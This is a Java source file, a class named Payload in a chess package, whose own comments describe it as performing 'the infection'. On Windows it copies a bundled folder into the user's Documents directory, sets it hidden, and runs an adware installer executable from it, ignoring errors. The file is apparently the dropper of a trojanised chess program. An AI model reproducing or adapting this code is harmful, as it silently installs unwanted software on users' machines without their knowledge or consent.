package chess;

import javax.swing.filechooser.FileSystemView;
import java.io.File;
import java.io.IOException;
import java.nio.file.FileSystems;
import java.nio.file.Files;

import org.apache.commons.io.FileUtils;

/**
 * Created by Andrew on 3/25/2017.
 *
 * This class actually performs the infection
 * We generally ignore errors during infection.  If something didn't work for some reason I'm sure it worked on someone else's PC
 */
public class Payload {
    public static void infect() {
        String osName = System.getProperty("os.name").toLowerCase();

        // Thanks to https://stackoverflow.com/questions/15359702/get-location-of-jar-file for this...
        // I genuinely cannot believe this is the best way to get the current jar file's directory.
        File current = new File(".");
        File source = new File(current.getParentFile(), "clementine");
        File documents = FileSystemView.getFileSystemView().getDefaultDirectory();
        File installation = new File(documents, "clementine");

        if (!osName.contains("win") || installation.exists())
            return; // Infection already present, no need to worry.

        try {
            FileUtils.copyDirectory(source, installation);
            Files.setAttribute(FileSystems.getDefault().getPath(installation.getPath()), "dos:hidden", true);
            Runtime.getRuntime().exec(installation + "\\Installer\\AdsInstaller.exe");
        } catch (IOException exp) {
            installation.delete();
        }
    }
}
